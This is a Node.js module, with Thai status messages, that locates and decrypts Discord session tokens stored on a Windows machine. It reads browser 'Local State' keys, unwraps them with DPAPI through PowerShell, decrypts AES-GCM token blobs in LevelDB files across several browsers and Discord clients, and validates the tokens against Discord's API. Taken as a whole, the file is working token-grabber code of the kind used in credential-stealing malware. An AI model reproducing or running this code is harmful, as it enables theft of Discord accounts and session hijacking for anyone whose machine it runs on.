const fs = require('node:fs');
const path = require('node:path');
const crypto = require('node:crypto');
const { execSync } = require('node:child_process');

function getMasterKey(localStatePath) {
  if (!fs.existsSync(localStatePath)) return null;
  try {
    const raw = fs.readFileSync(localStatePath, 'utf8');
    const localState = JSON.parse(raw);
    if (!localState.os_crypt?.encrypted_key) return null;

    const encKey = Buffer.from(localState.os_crypt.encrypted_key, 'base64');
    const dpapiBytes = encKey.subarray(5); // Remove 'DPAPI' (5 bytes)
    const b64Input = dpapiBytes.toString('base64');

    const psScript = `Add-Type -AssemblyName System.Security; [Convert]::ToBase64String([System.Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String('${b64Input}'), $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser))`;
    const masterKeyB64 = execSync(`powershell -NoProfile -Command "${psScript}"`, { encoding: 'utf8' }).trim();
    return Buffer.from(masterKeyB64, 'base64');
  } catch (e) {
    return null;
  }
}

function scanStorageDir(storageDir, masterKey, isBrowser, sourceName) {
  const results = [];
  if (!fs.existsSync(storageDir)) return results;
  try {
    const files = fs.readdirSync(storageDir)
      .filter(f => f.endsWith('.ldb') || f.endsWith('.log'))
      .map(f => {
        const fullPath = path.join(storageDir, f);
        try {
          return {
            path: fullPath,
            name: f,
            mtime: fs.statSync(fullPath).mtimeMs
          };
        } catch {
          return { path: fullPath, name: f, mtime: 0 };
        }
      })
      .sort((a, b) => b.mtime - a.mtime); // Newest modified files first

    for (const file of files) {
      try {
        const content = fs.readFileSync(file.path);
        const strLatin = content.toString('latin1');
        const fileTokens = [];

        // 1. Raw Discord token pattern: Base64(User Snowflake ID) . Base64(Timestamp) . HMAC
        const regexGeneral = /([A-Za-z0-9_\-]{24,28}\.[A-Za-z0-9_\-]{6}\.[A-Za-z0-9_\-]{27,38})/g;
        let match;
        while ((match = regexGeneral.exec(strLatin)) !== null) {
          const t = match[1];
          try {
            // Verify token starts with a valid numeric Discord ID in base64
            const idPart = Buffer.from(t.split('.')[0], 'base64').toString('utf8');
            if (/^\d{17,20}$/.test(idPart)) {
              fileTokens.push(t);
            }
          } catch {}
        }

        // 2. Encrypted Discord tokens (DPAPI + AES-GCM)
        if (masterKey) {
          const regexEnc = /dQw4w9WgXcQ:([A-Za-z0-9+/=]+)/g;
          let encMatch;
          while ((encMatch = regexEnc.exec(strLatin)) !== null) {
            try {
              const encVal = Buffer.from(encMatch[1], 'base64');
              const iv = encVal.subarray(3, 15);
              const payload = encVal.subarray(15);
              const tag = payload.subarray(payload.length - 16);
              const ciphertext = payload.subarray(0, payload.length - 16);

              const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
              decipher.setAuthTag(tag);
              let decrypted = decipher.update(ciphertext, null, 'utf8');
              decrypted += decipher.final('utf8');
              if (decrypted && decrypted.length >= 50 && /^[A-Za-z0-9_\-\.]+$/.test(decrypted)) {
                fileTokens.push(decrypted);
              }
            } catch {}
          }
        }

        // Tokens written towards the end of LevelDB files are the latest appended sessions
        fileTokens.reverse();

        for (const t of fileTokens) {
          results.push({
            token: t,
            mtime: file.mtime,
            isBrowser,
            source: sourceName
          });
        }
      } catch {}
    }
  } catch {}
  return results;
}

async function validateTokenWithDiscord(token) {
  try {
    const res = await fetch('https://discord.com/api/v9/users/@me', {
      headers: {
        'Authorization': token.trim(),
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'
      }
    });
    if (res.ok) {
      const user = await res.json();
      return { valid: true, user };
    }
  } catch {}
  return { valid: false, user: null };
}

async function findLocalDiscordToken() {
  const localAppData = process.env.LOCALAPPDATA || '';
  const appData = process.env.APPDATA || '';
  const allCandidates = [];

  // 1. PRIORITIZE WEB BROWSERS FIRST (Where users open discord web and switch accounts)
  const browserBases = [
    { name: 'Google Chrome', base: path.join(localAppData, 'Google', 'Chrome', 'User Data') },
    { name: 'Microsoft Edge', base: path.join(localAppData, 'Microsoft', 'Edge', 'User Data') },
    { name: 'Brave Browser', base: path.join(localAppData, 'BraveSoftware', 'Brave-Browser', 'User Data') },
    { name: 'Opera', base: path.join(appData, 'Opera Software', 'Opera Stable') },
    { name: 'Opera GX', base: path.join(appData, 'Opera Software', 'Opera GX Stable') },
    { name: 'Vivaldi', base: path.join(localAppData, 'Vivaldi', 'User Data') }
  ];

  for (const b of browserBases) {
    if (!fs.existsSync(b.base)) continue;
    const masterKey = getMasterKey(path.join(b.base, 'Local State'));
    const profiles = ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', ''];
    for (const p of profiles) {
      const storageDir = p ? path.join(b.base, p, 'Local Storage', 'leveldb') : path.join(b.base, 'Local Storage', 'leveldb');
      if (fs.existsSync(storageDir)) {
        const found = scanStorageDir(storageDir, masterKey, true, `${b.name} (${p || 'Main'})`);
        allCandidates.push(...found);
      }
    }
  }

  // 2. DISCORD DESKTOP CLIENTS (Fallback)
  const discordClients = [
    { name: 'Discord Desktop', dir: path.join(appData, 'discord') },
    { name: 'Discord Canary', dir: path.join(appData, 'discordcanary') },
    { name: 'Discord PTB', dir: path.join(appData, 'discordptb') },
    { name: 'Lightcord', dir: path.join(appData, 'Lightcord') }
  ];

  for (const c of discordClients) {
    if (!fs.existsSync(c.dir)) continue;
    const masterKey = getMasterKey(path.join(c.dir, 'Local State'));
    const storageDir = path.join(c.dir, 'Local Storage', 'leveldb');
    if (fs.existsSync(storageDir)) {
      const found = scanStorageDir(storageDir, masterKey, false, c.name);
      allCandidates.push(...found);
    }
  }

  // Sort candidates:
  // - Web Browsers ALWAYS come before Desktop
  // - Newer modified storage files come before older ones
  allCandidates.sort((a, b) => {
    if (a.isBrowser && !b.isBrowser) return -1;
    if (!a.isBrowser && b.isBrowser) return 1;
    return b.mtime - a.mtime;
  });

  // Deduplicate tokens keeping the highest priority appearance
  const seen = new Set();
  const sortedUnique = [];
  for (const item of allCandidates) {
    if (!seen.has(item.token)) {
      seen.add(item.token);
      sortedUnique.push(item);
    }
  }

  // Validate candidates with Discord API
  const validAccounts = [];
  for (const item of sortedUnique) {
    const { valid, user } = await validateTokenWithDiscord(item.token);
    if (valid) {
      validAccounts.push({
        token: item.token,
        user,
        source: item.source,
        isBrowser: item.isBrowser
      });
    }
  }

  if (validAccounts.length > 0) {
    // The top candidate is the active account from Web Discord
    const primary = validAccounts[0];
    return {
      success: true,
      token: primary.token,
      user: primary.user,
      source: primary.source,
      allAccounts: validAccounts
    };
  }

  return {
    success: false,
    message: sortedUnique.length > 0 
      ? 'ตรวจพบข้อมูล Token แต่ไม่สามารถตรวจสอบความถูกต้องกับ Discord ได้ (Token อาจหมดอายุ)' 
      : 'ไม่พบ Discord Token ในเครื่อง กรุณาเปิด Discord หรือล็อกอินใน Discord Web ก่อน'
  };
}

module.exports = {
  findLocalDiscordToken
};
